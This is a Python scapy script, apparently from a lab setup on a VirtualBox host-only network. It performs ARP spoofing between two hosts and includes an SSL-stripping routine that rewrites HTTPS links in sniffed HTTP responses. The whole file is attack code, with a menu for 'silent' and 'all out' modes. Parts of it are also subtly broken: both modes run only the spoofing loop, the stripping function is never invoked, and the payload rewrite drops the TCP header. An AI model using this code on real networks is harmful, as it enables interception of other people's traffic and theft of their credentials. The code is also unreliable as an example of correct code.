from scapy.all import *
import time



def ARP_spoofing():
    macM1 = "08:00:27:b7:c4:af"
    macM2 = "08:00:27:CC:28:6f"
    macM3 = "08:00:27:d0:25:4b"

    ipM1 = "192.168.56.101"
    ipM2 = "192.168.56.102"
    ipM3 = "192.168.56.103"

    arp_M1 = Ether() / ARP()
    arp_M1[Ether].src = macM3
    arp_M1[ARP].hwsrc = macM3
    arp_M1[ARP].psrc = ipM2
    arp_M1[ARP].hwdst = macM1
    arp_M1[ARP].pdst = ipM1

    arp_M2 = Ether() / ARP()
    arp_M2[Ether].src = macM3
    arp_M2[ARP].hwsrc = macM3
    arp_M2[ARP].psrc = ipM1
    arp_M2[ARP].hwdst = macM2
    arp_M2[ARP].pdst = ipM2
    sendp(arp_M1, iface = "enp0s3")
    sendp(arp_M2, iface = "enp0s3")

# SSL strip one packet
def ssl_strip(packet):
    if packet[TCP].payload:
        payload = bytes(packet[TCP].payload)

        # Only work with packets that are HTTP responses
        if b"HTTP" in payload and b"200 OK" in payload:
            # Strip the secure channels from the packet
            modified_payload = payload.replace(b"HTTPS://", b"HTTP://")
            packet.payload = bytes(modified_payload)

            # By deleting the checksums, scapy will automatically recalculate them
            del packet[IP].chksum
            del packet[TCP].chksum

            send(packet, verbose=0)

def ssl_strip_attack():
    # prn = function to apply to each sniffed packet
    sniff(filter="tcp and port 80", prn=ssl_strip)
	

def silent_mode():
    try:
        while True:
            ARP_spoofing()
            time.sleep(20)
    except KeyboardInterrupt:
        pass

def all_out_mode():
    try:
        while True:
            ARP_spoofing()
            time.sleep(20)
    except KeyboardInterrupt:
        pass

if __name__ == "__main__":
    mode = str(input(   "Plase select the attack mode:\n" +
                    "type \"1\" for silent mode;\n" +
                    "type \"2\" for all out mode\n"))
    if mode == "1":
        silent_mode()
    elif mode == "2":
        all_out_mode()
    else:
        print("Input error!")


        
